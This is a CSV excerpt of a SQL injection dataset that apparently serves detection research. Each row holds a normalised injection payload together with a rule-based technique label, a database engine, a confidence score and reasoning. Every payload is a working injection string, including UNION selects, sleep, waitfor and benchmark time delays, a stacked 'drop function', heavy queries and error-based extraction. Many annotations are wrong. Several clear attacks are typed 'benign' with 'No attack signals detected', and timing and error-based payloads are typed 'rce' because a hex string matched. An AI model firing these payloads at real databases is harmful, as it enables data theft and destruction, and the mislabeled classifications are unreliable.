row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
8460,if ( 2643 = 1393 ) select 2643 else drop function nqss--,1,,stacked_queries,generic,0.95,drop function detected — stacked_queries injection (priority 3) on generic,rule-based
8461,"1"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""njdx"" like ""njdx",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
8462,"1"" ) and ( 4085 = 4885 ) *4885 and ( ""sxte"" = ""sxte",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8463,"-9557 ) where 2891 = 2891 union all select 2891,2891,2891,2891,2891,2891,2891,2891,2891--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8464,"1"" union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8465,1' ) waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8466,"1' ) as bdei where 9531 = 9531 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
8467,"1' ) ) ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
8468,"1%' ) ) ) union all select null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8469,"1' in boolean mode ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,,rce,generic,0.95,0x6d457153 detected — rce injection (priority 1) on generic,rule-based
8470,"1 or elt ( 6272 = 6272,sleep ( 5 ) )",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
8471,"1' where 8969 = 8969 union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8472,-5299 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8473,"iif ( 2840 = 3788,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
8474,"1"" ) ) as xwrq where 4161 = 4161",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8475,-4681 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # rltx,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
8476,"1%"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,,rce,generic,0.95,0x6d457153 detected — rce injection (priority 1) on generic,rule-based
8477,select ( case when ( 2968 = 2021 ) then 1 else 2968* ( select 2968 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8478,"1' ) ) as fusi where 2788 = 2788 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
8479,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'kudh' like 'kudh",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8480,"-9947"" ) ) ) union all select 8765,8765,8765,8765,8765#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8481,1 ) as phja where 4627 = 4627,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8482,"1 ) where 5550 = 5550 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8483,"-9937' ) ) union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
8484,"1%"" ) ) and elt ( 7633 = 4110,4110 ) and ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
8485,"1' ) where 6387 = 6387 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
8486,"1' and elt ( 1533 = 5695,5695 ) and 'ycgi' = 'ycgi",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
8487,"1"" or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""xqgt"" like ""xqgt",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
8488,"1%' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
8489,"-4798"" ) ) ) union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
